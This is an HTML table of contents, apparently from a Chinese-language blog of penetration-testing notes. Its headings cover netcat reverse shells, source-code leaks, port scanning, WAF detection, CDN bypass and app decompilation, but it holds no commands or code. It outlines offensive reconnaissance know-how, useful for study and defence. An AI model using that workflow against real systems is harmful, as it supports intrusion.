+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Nc%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">1.Nc瑞士军刀使用详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-tcp%E7%9B%91%E5%90%AC"><span class="toc-number">1.1.</span> <span class="toc-text">1.tcp监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">2.传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-nc%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.</span> <span class="toc-text">3.nc反弹shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-number">2.</span> <span class="toc-text">2.加解密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%9C%E6%96%87%E5%AD%97%E5%8A%A0%E5%AF%86%EF%BC%9Aaaencode"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">颜文字加密：aaencode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%87%8C%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">图片里包含文件的技术</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.</span> <span class="toc-text">3.判断操作系统</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ttl"><span class="toc-number">3.1.</span> <span class="toc-text">ttl</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E5%AE%9A"><span class="toc-number">4.</span> <span class="toc-text">4.数据库判定</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E4%B8%BB%E5%8A%A8%E6%89%93%E7%82%B9%E5%92%8C%E8%A2%AB%E5%8A%A8%E6%89%93%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">5.主动打点和被动打点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E6%94%B6%E9%9B%86"><span class="toc-number">6.</span> <span class="toc-text">6.收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">6.1.</span> <span class="toc-text">操作系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80"><span class="toc-number">6.2.</span> <span class="toc-text">脚本语言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">6.3.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%90%8D%E7%A7%B0"><span class="toc-number">6.4.</span> <span class="toc-text">源码名称</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E6%B3%84%E9%9C%B2%E5%8E%9F%E7%A0%81%EF%BC%88cms%E6%89%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">7.泄露原码（cms找不到的情况）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#git%E5%92%8Csvn"><span class="toc-number">7.1.</span> <span class="toc-text">git和svn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E5%A4%87%E4%BB%BD"><span class="toc-number">7.2.</span> <span class="toc-text">目录备份</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DsStore"><span class="toc-number">7.3.</span> <span class="toc-text">DsStore</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">7.4.</span> <span class="toc-text">PHP源码泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-INF-web-xml"><span class="toc-number">7.5.</span> <span class="toc-text">WEB-INF&#x2F;web.xml</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">8.</span> <span class="toc-text">8.信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9%E3%80%82%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">9.</span> <span class="toc-text">9。端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-number">10.</span> <span class="toc-text">10.端口渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-c%E6%AE%B5-%E6%97%81%E6%B3%A8"><span class="toc-number">11.</span> <span class="toc-text">11.c段&#x2F;旁注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%81%E6%B3%A8"><span class="toc-number">11.1.</span> <span class="toc-text">旁注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c%E6%AE%B5"><span class="toc-number">11.2.</span> <span class="toc-text">c段</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cdn%E5%88%A4%E6%96%AD"><span class="toc-number">12.</span> <span class="toc-text">cdn判断</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#waf%E5%88%A4%E6%96%AD"><span class="toc-number">13.</span> <span class="toc-text">waf判断</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1"><span class="toc-number">13.1.</span> <span class="toc-text">负载均衡</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cdn%E7%BB%95%E8%BF%87"><span class="toc-number">14.</span> <span class="toc-text">cdn绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">14.1.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%9B%E9%80%BC%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">14.1.1.</span> <span class="toc-text">牛逼的工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0cdn%E5%90%8E%E5%92%8B%E5%8A%9E%EF%BC%9F"><span class="toc-number">14.1.2.</span> <span class="toc-text">找到cdn后咋办？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%92%8C%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">15.</span> <span class="toc-text">正向连接和反向连接</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">15.1.</span> <span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">15.2.</span> <span class="toc-text">反向连接</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%86%E5%90%91%E6%96%B9%E5%90%91"><span class="toc-number">16.</span> <span class="toc-text">逆向方向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-number">16.1.</span> <span class="toc-text">代码分析&amp;抓包分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">17.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%9C%A8%E6%90%9C%E7%B4%A2%EF%BC%9A"><span class="toc-number">17.1.</span> <span class="toc-text">内在搜索：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#appinfoScanner%E8%87%AA%E5%8A%A8%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-number">17.1.1.</span> <span class="toc-text">appinfoScanner自动反编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#idea%E6%89%8B%E5%8A%A8%E5%8F%8D%E7%BC%96%E8%AF%91%E5%86%85%E5%9C%A8%E6%90%9C%E7%B4%A2"><span class="toc-number">17.1.2.</span> <span class="toc-text">idea手动反编译内在搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%8D%93%E4%BF%AE%E6%94%B9%E5%A4%A7%E5%B8%88"><span class="toc-number">17.1.3.</span> <span class="toc-text">安卓修改大师</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
